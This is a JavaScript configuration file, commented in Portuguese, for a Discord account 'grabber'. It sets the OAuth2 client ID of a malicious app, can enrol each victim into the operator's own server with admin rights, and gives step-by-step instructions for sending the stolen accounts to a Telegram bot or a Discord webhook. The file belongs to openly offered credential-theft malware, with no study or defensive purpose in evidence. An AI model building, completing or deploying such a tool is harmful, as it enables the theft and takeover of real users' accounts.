// ============================================================
//  CONFIGURAÇÃO DO GRABBER — edite aqui antes de deployar
// ============================================================
export const CONFIG = {
  // Client ID do seu app (Developer Portal > Applications > OAuth2)
  clientId: "1572442202381230161",

  // OPCIONAL: ID de UM servidor SEU. Se preenchido, a vitima entra
  // nele automaticamente (com permissao de Admin) na hora de autorizar.
  // O bot do app PRECISA ja estar nesse servidor.
  guildId: "",

  // ONDE receber as contas roubadas — preencha pelo menos UMA opcao:
  //
  // Opcao A — Bot do Telegram (recomendado, chega soh pra voce):
  //   1) Fale com @BotFather no Telegram > /newbot > copie o token
  //   2) Mande qualquer mensagem pro seu bot e visite:
  //        https://api.telegram.org/bot<SEU_TOKEN>/getUpdates
  //      e copie o "chat":{"id": ...} que aparecer
  telegramBotToken: "",
  telegramChatId: "",

  // Opcao B — Webhook do Discord (num canal privado):
  //   Canal > Configurar Canal > Integrações > Webhooks > Novo
  discordWebhookUrl: "",
};
